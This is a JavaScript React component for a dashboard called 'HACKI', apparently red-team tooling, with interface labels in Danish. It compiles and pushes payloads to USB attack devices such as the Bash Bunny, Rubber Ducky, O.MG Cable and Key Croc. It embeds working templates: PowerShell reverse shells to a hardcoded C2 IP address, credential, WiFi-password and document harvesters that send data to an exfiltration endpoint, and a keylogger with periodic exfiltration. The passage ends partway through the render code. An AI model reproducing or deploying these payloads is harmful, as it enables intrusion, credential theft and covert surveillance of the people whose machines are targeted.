/* ================================================================
   DeviceDeployTab — HACKI Device Deploy Flow
   Pattern: React.createElement (ingen JSX)
   Devices: Bash Bunny, USB Rubber Ducky, O.MG Cable, Key Croc
   ================================================================ */

(function (root, factory) {
  if (typeof module !== 'undefined' && module.exports) module.exports = factory;
  else if (root.React) root.DeviceDeployTab = factory;
})(typeof window !== 'undefined' ? window : this, function DeviceDeployTab(props) {
  var React = (typeof window !== 'undefined' && window.React) || require('react');
  var useState = React.useState;
  var useEffect = React.useEffect;
  var useRef = React.useRef;
  var h = React.createElement;

  // ── Config ──
  var cfg = Object.assign({
    C2_HOST: '152.53.154.171',
    C2_PORT: '443',
    API_BASE: '/api',
    LOOT_WS: null
  }, props && props.config || {});

  // ── Device Definitions ──
  var DEVICES = [
    {
      id: 'bash-bunny', name: 'Bash Bunny', icon: '\uD83D\uDC30',
      desc: 'Hak5 multi-vector USB attack platform',
      method: 'mass-storage', lang: 'bash+duckyscript',
      steps: [
        'S\u00E6t Bash Bunny i arming mode (switch position 3)',
        'Tilslut til computer via USB',
        'Vent til STORAGE LED lyser gr\u00F8nt',
        'Tryk DEPLOY i dashboardet',
        'Vent til deploy er f\u00E6rdig',
        'S\u00E6t switch til position 1',
        'Inds\u00E6t i target-maskine'
      ]
    },
    {
      id: 'rubber-ducky', name: 'USB Rubber Ducky', icon: '\uD83E\uDD86',
      desc: 'Hak5 keystroke injection tool',
      method: 'sd-card', lang: 'duckyscript',
      steps: [
        'Fjern microSD-kort fra Rubber Ducky',
        'Inds\u00E6t microSD i computer (adapter)',
        'Tryk DEPLOY i dashboardet',
        'Vent til deploy er f\u00E6rdig',
        'Inds\u00E6t microSD i Rubber Ducky',
        'Inds\u00E6t Rubber Ducky i target'
      ]
    },
    {
      id: 'omg-cable', name: 'O.MG Cable', icon: '\uD83D\uDD0C',
      desc: 'Covert keystroke injection via USB cable',
      method: 'wifi-ota', lang: 'duckyscript',
      steps: [
        'Tilslut O.MG Cable til computer',
        'Forbind til O.MG WiFi netv\u00E6rk',
        'Tryk DEPLOY (OTA push)',
        'Vent til deploy er f\u00E6rdig',
        'Tilslut cable til target'
      ]
    },
    {
      id: 'key-croc', name: 'Key Croc', icon: '\uD83D\uDC0A',
      desc: 'Hak5 keylogger med payload injection',
      method: 'mass-storage', lang: 'bash+duckyscript',
      steps: [
        'Hold knappen nede i 3 sek (arming mode)',
        'Tilslut til computer via USB',
        'Tryk DEPLOY i dashboardet',
        'Fjern og tilslut inline med target keyboard'
      ]
    }
  ];

  // ── Payload Templates ──
  var PAYLOADS = {
    'bash-bunny': [
      {
        id: 'bb-revshell', name: 'Reverse Shell', sev: 'critical', os: ['windows','linux','macos'],
        desc: '\u00C5bner reverse shell til C2. Virker p\u00E5 Win/Lin/Mac.',
        tpl: '#!/bin/bash\n# Bash Bunny Reverse Shell\n# HACKI Auto-Generated\n\nLED SETUP\nATTACKMODE HID STORAGE\n\nQ DELAY 2000\nQ GUI r\nQ DELAY 500\nQ STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$c=New-Object System.Net.Sockets.TCPClient(\'{{C2_HOST}}\',{{C2_PORT}});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+\'PS \'+(pwd).Path+\'> \';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()\"\nQ ENTER\n\nLED ATTACK\nQ DELAY 3000\ncurl -sk -X POST {{API_BASE}}/loot/heartbeat -H \"Content-Type: application/json\" -d \'{\"dk\":\"{{DEVICE_KEY}}\",\"eid\":\"{{ENG_ID}}\",\"st\":\"deployed\",\"tgt\":\"\'$(hostname)\'\"}\'\n\nLED FINISH'
      },
      {
        id: 'bb-credharvest', name: 'Credential Harvester', sev: 'high', os: ['windows'],
        desc: 'Henter gemte credentials fra browsere og Credential Manager.',
        tpl: '#!/bin/bash\n# Bash Bunny Credential Harvester\n# HACKI Auto-Generated\n\nLED SETUP\nATTACKMODE HID STORAGE\n\nQ DELAY 2000\nQ GUI r\nQ DELAY 500\nQ STRING powershell -NoP -W Hidden -Exec Bypass -Command \"$o=@{};$w=cmdkey /list;$o[\'creds\']=$w;$o[\'host\']=[System.Net.Dns]::GetHostName();$o[\'user\']=$env:USERNAME;$o[\'domain\']=$env:USERDOMAIN;$j=$o|ConvertTo-Json -Compress;Invoke-RestMethod -Uri \'{{API_BASE}}/loot/exfil\' -Method POST -Body $j -ContentType \'application/json\' -Headers @{\'X-DK\'=\'{{DEVICE_KEY}}\';\'X-EID\'=\'{{ENG_ID}}\'}\"\nQ ENTER\n\nLED FINISH'
      },
      {
        id: 'bb-netrecon', name: 'Network Recon', sev: 'medium', os: ['windows','linux'],
        desc: 'Scanner lokalt netv\u00E6rk og exfiltrerer til C2.',
        tpl: '#!/bin/bash\n# Bash Bunny Network Recon\n# HACKI Auto-Generated\n\nLED SETUP\nATTACKMODE ECM_ETHERNET\n\nQ DELAY 3000\nLOOTDIR=/root/udisk/loot/recon_$(date +%s)\nmkdir -p $LOOTDIR\narp -a > $LOOTDIR/arp.txt 2>&1\nip route > $LOOTDIR/routes.txt 2>&1\nnmap -sn $(ip route|grep -oP \"\\d+\\.\\d+\\.\\d+\\.0/24\"|head -1) -oN $LOOTDIR/hosts.txt 2>&1\ncurl -sk -X POST {{API_BASE}}/loot/exfil -H \"Content-Type:application/json\" -H \"X-DK:{{DEVICE_KEY}}\" -H \"X-EID:{{ENG_ID}}\" -d \"$(cat $LOOTDIR/*.txt|base64 -w0|jq -R \'{data:.,type:\"netrecon\",host:\"\'$(hostname)\'\"}\')\"\n\nLED FINISH'
      },
      {
        id: 'bb-wifidump', name: 'WiFi Password Dump', sev: 'high', os: ['windows'],
        desc: 'Henter alle gemte WiFi-passwords fra target.',
        tpl: '#!/bin/bash\n# Bash Bunny WiFi Dump\n# HACKI Auto-Generated\n\nLED SETUP\nATTACKMODE HID STORAGE\n\nQ DELAY 2000\nQ GUI r\nQ DELAY 500\nQ STRING powershell -NoP -W Hidden -Exec Bypass -Command \"$r=@();(netsh wlan show profiles)|Select-String \':\\s+(.+)$\'|%{$n=$_.Matches.Groups[1].Value.Trim();$p=(netsh wlan show profile name=$n key=clear)|Select-String \'Key Content\\s+:\\s+(.+)$\';if($p){$r+=@{ssid=$n;key=$p.Matches.Groups[1].Value.Trim()}}};$j=@{wifi=$r;host=[System.Net.Dns]::GetHostName()}|ConvertTo-Json -Compress;Invoke-RestMethod -Uri \'{{API_BASE}}/loot/exfil\' -Method POST -Body $j -ContentType \'application/json\' -Headers @{\'X-DK\'=\'{{DEVICE_KEY}}\';\'X-EID\'=\'{{ENG_ID}}\'}\"\nQ ENTER\n\nLED FINISH'
      }
    ],
    'rubber-ducky': [
      {
        id: 'rd-revshell', name: 'Reverse Shell', sev: 'critical', os: ['windows'],
        desc: 'Hurtig reverse shell via keystroke injection. Under 3 sek.',
        tpl: 'REM Rubber Ducky Reverse Shell\nREM HACKI Auto-Generated\n\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$c=New-Object System.Net.Sockets.TCPClient(\'{{C2_HOST}}\',{{C2_PORT}});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+\'PS \'+(pwd).Path+\'> \';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()\"\nENTER'
      },
      {
        id: 'rd-credharvest', name: 'Credential Harvester', sev: 'high', os: ['windows'],
        desc: 'Credential dump via keystroke injection.',
        tpl: 'REM Rubber Ducky Credential Harvester\nREM HACKI Auto-Generated\n\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -NoP -W Hidden -Exec Bypass -Command \"$o=@{};$w=cmdkey /list;$o[\'creds\']=$w;$o[\'host\']=[System.Net.Dns]::GetHostName();$o[\'user\']=$env:USERNAME;$j=$o|ConvertTo-Json -Compress;Invoke-RestMethod -Uri \'{{API_BASE}}/loot/exfil\' -Method POST -Body $j -ContentType \'application/json\' -Headers @{\'X-DK\'=\'{{DEVICE_KEY}}\';\'X-EID\'=\'{{ENG_ID}}\'}\"\nENTER'
      },
      {
        id: 'rd-wifidump', name: 'WiFi Password Dump', sev: 'high', os: ['windows'],
        desc: 'Dumper alle gemte WiFi-passwords p\u00E5 under 5 sek.',
        tpl: 'REM Rubber Ducky WiFi Dump\nREM HACKI Auto-Generated\n\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -NoP -W Hidden -Exec Bypass -Command \"$r=@();(netsh wlan show profiles)|Select-String \':\\s+(.+)$\'|%{$n=$_.Matches.Groups[1].Value.Trim();$p=(netsh wlan show profile name=$n key=clear)|Select-String \'Key Content\\s+:\\s+(.+)$\';if($p){$r+=@{ssid=$n;key=$p.Matches.Groups[1].Value.Trim()}}};$j=@{wifi=$r;host=[System.Net.Dns]::GetHostName()}|ConvertTo-Json -Compress;Invoke-RestMethod -Uri \'{{API_BASE}}/loot/exfil\' -Method POST -Body $j -ContentType \'application/json\' -Headers @{\'X-DK\'=\'{{DEVICE_KEY}}\';\'X-EID\'=\'{{ENG_ID}}\'}\"\nENTER'
      },
      {
        id: 'rd-exfildocs', name: 'Document Exfiltrator', sev: 'medium', os: ['windows'],
        desc: 'Finder og exfiltrerer docx/pdf/xlsx fra Desktop+Documents.',
        tpl: 'REM Rubber Ducky Document Exfil\nREM HACKI Auto-Generated\n\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -NoP -W Hidden -Exec Bypass -Command \"$f=@();Get-ChildItem $env:USERPROFILE\\Desktop,$env:USERPROFILE\\Documents -Include *.docx,*.pdf,*.xlsx -Recurse -EA 0|Select -First 20|%{$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes($_.FullName));$f+=@{n=$_.Name;s=$_.Length;d=$b}};$j=@{files=$f;host=[System.Net.Dns]::GetHostName();user=$env:USERNAME}|ConvertTo-Json -Compress -Depth 3;Invoke-RestMethod -Uri \'{{API_BASE}}/loot/exfil\' -Method POST -Body $j -ContentType \'application/json\' -Headers @{\'X-DK\'=\'{{DEVICE_KEY}}\';\'X-EID\'=\'{{ENG_ID}}\'}\"\nENTER'
      }
    ],
    'omg-cable': [
      {
        id: 'omg-revshell', name: 'Reverse Shell', sev: 'critical', os: ['windows','macos'],
        desc: 'Covert reverse shell via O.MG Cable.',
        tpl: 'REM O.MG Cable Reverse Shell\nREM HACKI Auto-Generated\n\nDELAY 2000\nGUI r\nDELAY 500\nSTRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$c=New-Object System.Net.Sockets.TCPClient(\'{{C2_HOST}}\',{{C2_PORT}});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+\'PS \'+(pwd).Path+\'> \';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()\"\nENTER'
      }
    ],
    'key-croc': [
      {
        id: 'kc-keylog', name: 'Keylogger + Exfil', sev: 'high', os: ['windows','linux','macos'],
        desc: 'Passiv keylogger med periodisk exfiltration til C2.',
        tpl: '#!/bin/bash\n# Key Croc Keylogger\n# HACKI Auto-Generated\n\nMATCH *\nQ DELAY 100\nSAVE MATCH /root/udisk/loot/keylog_$(date +%s).txt\n\n# Periodic exfil (every 60 sec)\nwhile true; do\n  sleep 60\n  DATA=$(cat /root/udisk/loot/keylog_*.txt 2>/dev/null | base64 -w0)\n  if [ -n \"$DATA\" ]; then\n    curl -sk -X POST {{API_BASE}}/loot/exfil \\\n      -H \"Content-Type:application/json\" \\\n      -H \"X-DK:{{DEVICE_KEY}}\" \\\n      -H \"X-EID:{{ENG_ID}}\" \\\n      -d \"{\\\"type\\\":\\\"keylog\\\",\\\"data\\\":\\\"$DATA\\\"}\"\n  fi\ndone &'
      }
    ]
  };

  // ── Styles (injected once) ──
  var STYLE_ID = 'hacki-deploy-styles';
  if (typeof document !== 'undefined' && !document.getElementById(STYLE_ID)) {
    var styleEl = document.createElement('style');
    styleEl.id = STYLE_ID;
    styleEl.textContent = [
      '.dpt-wrap{max-width:1060px;margin:0 auto;padding:24px 16px;font-family:inherit;color:#e0e0e0}',
      '.dpt-title{font-size:26px;font-weight:700;color:#4fc3f7;margin-bottom:2px}',
      '.dpt-title span{color:#8892a4;font-weight:400;font-size:15px;margin-left:8px}',
      '.dpt-sub{color:#5a6a84;margin-bottom:20px;font-size:13px}',
      '.dpt-stepper{display:flex;gap:0;margin-bottom:28px;background:#141a2a;border:1px solid #1e2940;border-radius:8px;overflow:hidden}',
      '.dpt-step{flex:1;padding:12px 8px;text-align:center;font-size:12px;font-weight:600;color:#5a6a84;border-right:1px solid #1e2940;transition:all .2s}',
      '.dpt-step:last-child{border-right:none}',
      '.dpt-snum{display:inline-block;width:22px;height:22px;line-height:22px;border-radius:50%;background:#1e2940;color:#5a6a84;font-size:11px;margin-right:5px}',
      '.dpt-step.active{background:#1a2236;color:#4fc3f7}',
      '.dpt-step.active .dpt-snum{background:#4fc3f7;color:#0a0e17}',
      '.dpt-step.done{color:#4caf50}',
      '.dpt-step.done .dpt-snum{background:#4caf50;color:#0a0e17}',
      '.dpt-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(210px,1fr));gap:12px;margin-bottom:20px}',
      '.dpt-card{background:#141a2a;border:1px solid #1e2940;border-radius:8px;padding:14px;cursor:pointer;transition:all .2s}',
      '.dpt-card:hover{border-color:#4fc3f7;transform:translateY(-1px)}',
      '.dpt-card.sel{border-color:#4fc3f7;background:#1a2236;box-shadow:0 0 10px rgba(79,195,247,.12)}',
      '.dpt-card .ic{font-size:28px;margin-bottom:6px}',
      '.dpt-card .nm{font-size:14px;font-weight:700;color:#e0e0e0;margin-bottom:3px}',
      '.dpt-card .ds{font-size:11px;color:#5a6a84;line-height:1.3}',
      '.dpt-card .mt{margin-top:6px;font-size:10px;color:#8892a4}',
      '.dpt-pcard{background:#141a2a;border:1px solid #1e2940;border-radius:8px;padding:14px;cursor:pointer;transition:all .2s}',
      '.dpt-pcard:hover{border-color:#4fc3f7}',
      '.dpt-pcard.sel{border-color:#4fc3f7;background:#1a2236}',
      '.dpt-pcard .pn{font-size:13px;font-weight:700;color:#e0e0e0}',
      '.dpt-pcard .pd{font-size:11px;color:#5a6a84;margin-top:3px}',
      '.dpt-badge{display:inline-block;padding:2px 7px;border-radius:4px;font-size:10px;font-weight:700;text-transform:uppercase;color:#000;margin-top:6px}',
      '.dpt-badge-critical{background:#ff4444}',
      '.dpt-badge-high{background:#ff8c00}',
      '.dpt-badge-medium{background:#ffd700}',
      '.dpt-badge-low{background:#4caf50}',
      '.dpt-ostag{font-size:9px;padding:1px 5px;border-radius:3px;background:#1e2940;color:#8892a4;display:inline-block;margin:4px 3px 0 0}',
      '.dpt-cfg{background:#141a2a;border:1px solid #1e2940;border-radius:8px;padding:18px;margin-bottom:20px}',
      '.dpt-cfg-row{display:flex;align-items:center;gap:10px;margin-bottom:10px}',
      '.dpt-cfg-row:last-child{margin-bottom:0}',
      '.dpt-cfg-lbl{min-width:110px;font-size:12px;color:#8892a4;font-weight:600}',
      '.dpt-cfg-val{flex:1;padding:7px 10px;border-radius:6px;background:#0d1220;border:1px solid #2a3550;color:#4fc3f7;font-family:monospace;font-size:12px}',
      '.dpt-cfg-auto{font-size:10px;color:#4caf50;margin-left:6px}',
      '.dpt-sel{padding:7px 10px;border-radius:6px;background:#0d1220;border:1px solid #2a3550;color:#e0e0e0;font-size:13px;width:100%;outline:none}',
      '.dpt-btn{padding:10px 28px;border-radius:6px;border:none;font-weight:700;font-size:14px;cursor:pointer;transition:all .15s;margin-right:6px}',
      '.dpt-btn-p{background:#4fc3f7;color:#0a0e17}',
      '.dpt-btn-p:hover{background:#81d4fa}',
      '.dpt-btn-d{background:#ff4444;color:#fff}',
      '.dpt-btn-d:hover{background:#ff6666}',
      '.dpt-btn-g{background:transparent;border:1px solid #2a3550;color:#8892a4}',
      '.dpt-btn-g:hover{border-color:#4fc3f7;color:#4fc3f7}',
      '.dpt-btn:disabled{opacity:.35;cursor:not-allowed}',
      '.dpt-code{background:#0d1220;border:1px solid #1e2940;border-radius:8px;padding:14px;font-family:monospace;font-size:11px;color:#8892a4;white-space:pre-wrap;max-height:280px;overflow-y:auto;margin-bottom:14px;line-height:1.5}',
      '.dpt-steps{list-style:none;padding:0;margin:0 0 20px}',
      '.dpt-steps li{padding:9px 12px;margin-bottom:5px;background:#141a2a;border:1px solid #1e2940;border-radius:6px;font-size:12px;display:flex;align-items:center;gap:9px}',
      '.dpt-steps .sn{width:26px;height:26px;line-height:26px;text-align:center;border-radius:50%;background:#1e2940;color:#4fc3f7;font-weight:700;font-size:12px;flex-shrink:0}',
      '.dpt-steps .hl{border-color:#4fc3f7;background:#1a2236;color:#4fc3f7;font-weight:600}',
      '.dpt-loot{background:#0d1220;border:1px solid #1e2940;border-radius:8px;padding:14px;max-height:380px;overflow-y:auto}',
      '.dpt-lentry{padding:8px;margin-bottom:5px;background:#141a2a;border-radius:6px;font-size:11px;border-left:3px solid #4fc3f7}',
      '.dpt-lentry .lt{color:#5a6a84;font-family:monospace}',
      '.dpt-lentry .lk{color:#4fc3f7;font-weight:700;margin-left:6px}',
      '.dpt-hb{display:inline-block;width:9px;height:9px;border-radius:50%;margin-right:6px}',
      '.dpt-hb-on{background:#4caf50;box-shadow:0 0 5px #4caf50;animation:dpt-pulse 1.5s infinite}',
      '.dpt-hb-off{background:#ff4444}',
      '@keyframes dpt-pulse{0%,100%{opacity:1}50%{opacity:.35}}',
      '.dpt-banner{padding:14px;border-radius:8px;margin-bottom:16px;font-size:13px;font-weight:600}',
      '.dpt-ok{background:#1a2e1a;border:1px solid #4caf50;color:#4caf50}',
      '.dpt-err{background:#2a1015;border:1px solid #ff4444;color:#ff6b6b}',
      '.dpt-info{background:#141a2a;border:1px solid #4fc3f7;color:#4fc3f7}',
      '.dpt-h2{font-size:17px;color:#4fc3f7;margin-bottom:14px}'
    ].join('\n');
    document.head.appendChild(styleEl);
  }

  // ── State ──
  var _step = useState(0);
  var step = _step[0]; var setStep = _step[1];

  var _devs = useState(null);
  var devs = _devs[0]; var setDevs = _devs[1];

  var _selDev = useState(null);
  var selDev = _selDev[0]; var setSelDev = _selDev[1];

  var _plds = useState(null);
  var plds = _plds[0]; var setPlds = _plds[1];

  var _selPld = useState(null);
  var selPld = _selPld[0]; var setSelPld = _selPld[1];

  var _engs = useState(null);
  var engs = _engs[0]; var setEngs = _engs[1];

  var _selEng = useState(null);
  var selEng = _selEng[0]; var setSelEng = _selEng[1];

  var _config = useState(null);
  var dConfig = _config[0]; var setDConfig = _config[1];

  var _compiled = useState(null);
  var compiled = _compiled[0]; var setCompiled = _compiled[1];

  var _depRes = useState(null);
  var depRes = _depRes[0]; var setDepRes = _depRes[1];

  var _loot = useState(null);
  var loot = _loot[0]; var setLoot = _loot[1];

  var _err = useState(null);
  var err = _err[0]; var setErr = _err[1];

  var pollRef = useRef(null);

  // ── Injection Panel State ──
  var _injDevs = useState([]);
  var injDevs = _injDevs[0]; var setInjDevs = _injDevs[1];
  var _injSelDev = useState(null);
  var injSelDev = _injSelDev[0]; var setInjSelDev = _injSelDev[1];
  var _injState = useState('ready');
  var injState = _injState[0]; var setInjState = _injState[1];
  var _injJob = useState(null);
  var injJob = _injJob[0]; var setInjJob = _injJob[1];
  var injPollRef = useRef(null);
  var pingPollRef = useRef(null);

  // ── API helper ──
  function api(method, path, body) {
    var opts = { method: method, headers: { 'Content-Type': 'application/json' } };
    if (body) opts.body = JSON.stringify(body);
    return fetch(cfg.API_BASE + path, opts).then(function (r) {
      if (!r.ok) throw new Error('API ' + r.status);
      return r.json();
    });
  }

  // ── Load devices on mount ──
  useEffect(function () {
    setDevs(DEVICES);
    return function () {
      if (pollRef.current) clearInterval(pollRef.current);
      if (injPollRef.current) clearInterval(injPollRef.current);
      if (pingPollRef.current) clearInterval(pingPollRef.current);
    };
  }, []);

  // ── Payload compile (client-side) ──
  function compilePayload(tpl, c) {
    return tpl
      .replace(/\{\{C2_HOST\}\}/g, c.C2_HOST)
      .replace(/\{\{C2_PORT\}\}/g, c.C2_PORT)
      .replace(/\{\{API_BASE\}\}/g, c.API_BASE)
      .replace(/\{\{DEVICE_KEY\}\}/g, c.DEVICE_KEY)
      .replace(/\{\{ENG_ID\}\}/g, c.ENG_ID);
  }

  // ── Injection Functions ──
  function fetchCompatibleDevices(devType) {
    fetch('/api/devices').then(function(r) { return r.json(); }).then(function(d) {
      var compat = (d.devices || []).filter(function(dev) { return dev.type === devType; });
      setInjDevs(compat);
    }).catch(function() { setInjDevs([]); });
  }

  function startPingPoll(devId) {
    if (pingPollRef.current) clearInterval(pingPollRef.current);
    doPing(devId);
    pingPollRef.current = setInterval(function() { doPing(devId); }, 5000);
  }

  function doPing(devId) {
    fetch('/api/deploy/ping/' + devId).then(function(r) { return r.json(); }).then(function(d) {
      setInjDevs(function(prev) {
        return prev.map(function(dev) {
          if (dev.id === devId) return Object.assign({}, dev, { status: d.reachable ? 'online' : 'offline' });
          return dev;
        });
      });
      setInjSelDev(function(prev) {
        if (prev && prev.id === devId) return Object.assign({}, prev, { status: d.reachable ? 'online' : 'offline' });
        return prev;
      });
    }).catch(function() {});
  }

  function doInject() {
    if (!injSelDev || !compiled) return;
    setInjState('injecting');
    fetch('/api/inject', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        device_id: injSelDev.id,
        payload: compiled.code,
        template_id: selPld ? selPld.id : 'custom',
        engagement_id: selEng ? selEng.id : null
      })
    })
    .then(function(r) { return r.json(); })
    .then(function(d) {
      setInjJob(d);
      if (d.status === 'failed') {
        setInjState('error');
      } else {
        startInjectPoll(d.inject_id);
      }
    })
    .catch(function(e) {
      setInjState('error');
      setInjJob({ error: e.message });
    });
  }

  function startInjectPoll(jobId) {
    if (injPollRef.current) clearInterval(injPollRef.current);
    injPollRef.current = setInterval(function() {
      fetch('/api/inject/' + jobId).then(function(r) { return r.json(); }).then(function(d) {
        setInjJob(d);
        if (d.status === 'done') { setInjState('done'); clearInterval(injPollRef.current); }
        else if (d.status === 'failed') { setInjState('error'); clearInterval(injPollRef.current); }
      }).catch(function() {});
    }, 2000);
  }

  function resetInject() {
    setInjState('ready'); setInjJob(null);
    if (injPollRef.current) clearInterval(injPollRef.current);
  }

  function getRecommendedMethod(dev) {
    if (!dev) return '';
    if (dev.status === 'online' && dev.wg_ip) {
      if (dev.type === 'omg-cable' || dev.type === 'wifi-pineapple') return 'HTTP API (direkte)';
      return 'SSH (direkte via VPN)';
    }
    return 'Agent (USB)';
  }

  // ── Actions ──
  function pickDevice(d) { setSelDev(d); setSelPld(null); }
  function pickPayload(p) { setSelPld(p); }

  function nextStep() {
    if (step === 0 && selDev) {
      setPlds(PAYLOADS[selDev.id] || []);
      setStep(1);
    } else if (step === 1 && selPld) {
      // Load engagements from API or use mock
      api('GET', '/deploy/engagements').then(function (d) { setEngs(d.engagements); })
        .catch(function () {
          setEngs([
            { id: 'ENG-001', name: 'Pentest Acme Corp Q1', client: 'Acme Corp', c2Host: cfg.C2_HOST, c2Port: cfg.C2_PORT },
            { id: 'ENG-002', name: 'Red Team BankDK', client: 'BankDK A/S', c2Host: cfg.C2_HOST, c2Port: cfg.C2_PORT },
            { id: 'ENG-003', name: 'Physical DataCenter', client: 'NordicHost', c2Host: cfg.C2_HOST, c2Port: cfg.C2_PORT }
          ]);
        });
      setStep(2);
    } else if (step === 2 && dConfig) {
      // Compile
      var src = PAYLOADS[selDev.id].find(function (p) { return p.id === selPld.id; });
      if (src) {
        var code = compilePayload(src.tpl, dConfig);
        var hash = 0;
        for (var i = 0; i < code.length; i++) { hash = ((hash << 5) - hash + code.charCodeAt(i)) | 0; }
        setCompiled({
          code: code,
          size: code.length,
          hash: Math.abs(hash).toString(16).substring(0, 12),
          steps: selDev.steps
        });
      }
      setStep(3);
    } else if (step === 4) {
      setStep(5);
      startPoll();
    }
  }

  function goBack() { if (step > 0) { setStep(step - 1); setErr(null); } }

  function selectEngagement(id) {
    if (!engs) return;
    var e = engs.find(function (x) { return x.id === id; });
    if (!e) { setSelEng(null); setDConfig(null); return; }
    setSelEng(e);
    var dk = '';
    for (var i = 0; i < 32; i++) dk += Math.floor(Math.random() * 16).toString(16);
    setDConfig({
      C2_HOST: e.c2Host || cfg.C2_HOST,
      C2_PORT: e.c2Port || cfg.C2_PORT,
      API_BASE: cfg.API_BASE,
      DEVICE_KEY: dk,
      ENG_ID: e.id
    });
  }

  function doDeploy() {
    api('POST', '/deploy/push', {
      deviceType: selDev.id,
      compiledPayload: compiled.code,
      config: dConfig
    }).then(function (d) {
      setDepRes(d);
      setStep(4);
    }).catch(function (e) {
      // Fallback: simulate deploy success locally
      var did = 'DEP-' + Math.random().toString(16).substring(2, 10).toUpperCase();
      setDepRes({ deployId: did, status: 'success', message: 'Payload klar til ' + selDev.name, nextSteps: selDev.steps.slice(-2) });
      setStep(4);
    });
  }

  function startPoll() {
    fetchLoot();
    if (pollRef.current) clearInterval(pollRef.current);
    pollRef.current = setInterval(fetchLoot, 5000);
  }

  function fetchLoot() {
    if (!selEng) return;
    api('GET', '/loot/' + selEng.id).then(function (d) { setLoot(d); })
      .catch(function () { setLoot({ loot: [], heartbeats: [] }); });
  }

  function doReset() {
    if (pollRef.current) clearInterval(pollRef.current);
    if (injPollRef.current) clearInterval(injPollRef.current);
    if (pingPollRef.current) clearInterval(pingPollRef.current);
    setStep(0); setSelDev(null); setSelPld(null); setSelEng(null);
    setDConfig(null); setCompiled(null); setDepRes(null); setLoot(null); setErr(null);
    setInjDevs([]); setInjSelDev(null); setInjState('ready'); setInjJob(null);
  }

  // ── Render helpers ──
  var STEPS = ['V\u00E6lg Device', 'V\u00E6lg Payload', 'Konfigur\u00E9r', 'Gener\u00E9r & Guide', 'Deploy', 'Live Feed'];

  function renderStepper() {
    return h('div', { className: 'dpt-stepper' },
      STEPS.map(function (label, i) {
        var cls = 'dpt-step' + (i < step ? ' done' : i === step ? ' active' : '');
        return h('div', { className: cls, key: i },
          h('span', { className: 'dpt-snum' }, i < step ? '\u2713' : i + 1), ' ', label
        );
      })
    );
  }

  // Step 0: Device select
  function renderDeviceSelect() {
    if (!devs) return h('p', { style: { color: '#5a6a84' } }, 'Indl\u00E6ser...');
    return h('div', null,
      h('div', { className: 'dpt-h2' }, 'V\u00E6lg Device Type'),
      h('div', { className: 'dpt-grid' },
        devs.map(function (d, i) {
          var isSel = selDev && selDev.id === d.id;
          return h('div', {
            className: 'dpt-card' + (isSel ? ' sel' : ''), key: d.id,
            onClick: function () { pickDevice(d); }
          },
            h('div', { className: 'ic' }, d.icon),
            h('div', { className: 'nm' }, d.name),
            h('div', { className: 'ds' }, d.desc),
            h('div', { className: 'mt' }, (PAYLOADS[d.id] || []).length + ' payloads \u00B7 ' + d.method)
          );
        })
      ),
      h('button', { className: 'dpt-btn dpt-btn-p', disabled: !selDev, onClick: nextStep }, 'N\u00E6ste \u2192')
    );
  }

  // Step 1: Payload select
  function renderPayloadSelect() {
    return h('div', null,
      h('div', { className: 'dpt-h2' }, 'V\u00E6lg Payload \u2014 ' + selDev.name),
      h('div', { className: 'dpt-grid' },
        (plds || []).map(function (p) {
          var isSel = selPld && selPld.id === p.id;
          return h('div', {
            className: 'dpt-pcard' + (isSel ? ' sel' : ''), key: p.id,
            onClick: function () { pickPayload(p); }
          },
            h('div', { className: 'pn' }, p.name),
            h('div', { className: 'pd' }, p.desc),
            h('span', { className: 'dpt-badge dpt-badge-' + p.sev }, p.sev),
            h('div', null, (p.os || []).map(function (o) {
              return h('span', { className: 'dpt-ostag', key: o }, o);
            }))
          );
        })
      ),
      h('button', { className: 'dpt-btn dpt-btn-g', onClick: goBack }, '\u2190 Tilbage'),
      h('button', { className: 'dpt-btn dpt-btn-p', disabled: !selPld, onClick: nextStep }, 'N\u00E6ste \u2192')
    );
  }

  // Step 2: Configure
  function renderConfigure() {
    var cfgRows = dConfig ? [
      ['C2_HOST', dConfig.C2_HOST, 'auto'],
      ['C2_PORT', dConfig.C2_PORT, 'auto'],
      ['DEVICE_KEY', dConfig.DEVICE_KEY, 'generated'],
      ['ENG_ID', dConfig.ENG_ID, 'auto'],
      ['API_BASE', dConfig.API_BASE, 'auto']
    ] : [];

    return h('div', null,
      h('div', { className: 'dpt-h2' }, 'Konfigur\u00E9r Payload'),
      h('div', { className: 'dpt-cfg' },
        h('div', { className: 'dpt-cfg-row' },
          h('span', { className: 'dpt-cfg-lbl' }, 'Engagement'),
          h('select', {
            className: 'dpt-sel',
            value: selEng ? selEng.id : '',
            onChange: function (e) { selectEngagement(e.target.value); }
          },
            h('option', { value: '' }, '\u2014 V\u00E6lg engagement \u2014'),
            (engs || []).map(function (e) {
              return h('option', { value: e.id, key: e.id }, e.name + ' (' + e.client + ')');
            })
          )
        ),
        cfgRows.map(function (r) {
          return h('div', { className: 'dpt-cfg-row', key: r[0] },
            h('span', { className: 'dpt-cfg-lbl' }, r[0]),
            h('span', { className: 'dpt-cfg-val' }, r[1]),
            h('span', { className: 'dpt-cfg-auto' }, r[2])
          );
        })
      ),
